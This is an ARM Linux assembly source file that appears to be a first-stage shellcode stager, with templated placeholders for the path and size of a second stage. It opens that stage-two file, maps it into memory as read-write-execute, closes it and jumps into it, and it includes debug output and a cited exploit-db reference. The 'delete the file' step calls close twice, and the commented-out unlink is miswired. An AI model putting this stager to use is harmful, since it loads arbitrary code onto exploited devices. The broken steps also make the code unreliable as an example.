.globl _start
_start:
	// TKTK: save any necessary registers

	adr r9, dmsg
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r9, r9, #1		@ Increment debug string counter
	//end: debug
	
	b beginStager
	
	dmsg:
		.ascii "123456789ABCDEF\0"
		.align 8

beginStager:
	// Open stage2 file
	mov r7, #5			@ SYS_OPEN
	adr r0, path		@ path
	mov r1, #0       	@ flags (O_RDONLY)
	mov r2, #0        	@ mode
	swi 0x0				@ syscall
	mov r11, r0        	@ save the fd for later
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r9, r9, #1		@ Increment debug string counter
	//end: debug

	// mmap it
	//sub sp,sp,#0x10
	//mov r7, #90             					@ SYS_MMAP
	// I don't know why, but calling sys_mmap fails, while using SYS_MMAP2 with the same parameters succeeds
	// Thanks Andrea Sindoni! (https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf)
	mov r7, #192             					@ SYS_MMAP2
	mov r0, #0	            					@ addr
	mov r1, #[VARIABLE:STAGE2_SIZE:VARIABLE]  	@ len
	mov r2, #0x7            					@ prot (rwx)
	//mov r2, #0x5            					@ prot (r-x)
	mov r3, #0x2            					@ flags (MAP_PRIVATE)
	// file descriptor and offset need to go on the stack
	mov r4, r11             					@ fd
	mov r5, #0              					@ offset
	//str r11, [sp,#-0xc]
	//str r5, [sp,#-0x10]
	swi 0x0										@ syscall
	mov r10, r0            						@ save mmap addr
	//ldr r10, [r0]            						@ save mmap addr
	// discard extra stack data
	//add sp, sp, #0x10
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r9, r9, #1		@ Increment debug string counter
	//end: debug

	// close the file
	mov r7, #6			@ SYS_CLOSE
	mov r0, r11  		@ fd
	swi 0x0				@ syscall
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r9, r9, #1		@ Increment debug string counter
	//end: debug

	// delete the file (not exactly necessary)
	mov r7, #6			@ SYS_CLOSE
	mov r0, r11  		@ fd
	swi 0x0				@ syscall
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r9, r9, #1		@ Increment debug string counter
	//end: debug
	
	//mov r0, #10        @ SYS_UNLINK
	//adr r0, path  		@ path
	//swi 0x0				@ syscall
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r9, r9, #1		@ Increment debug string counter
	//end: debug

	// jump to stage2
	blx r10

path:
	.ascii "[VARIABLE:STAGE2_PATH:VARIABLE]\0"


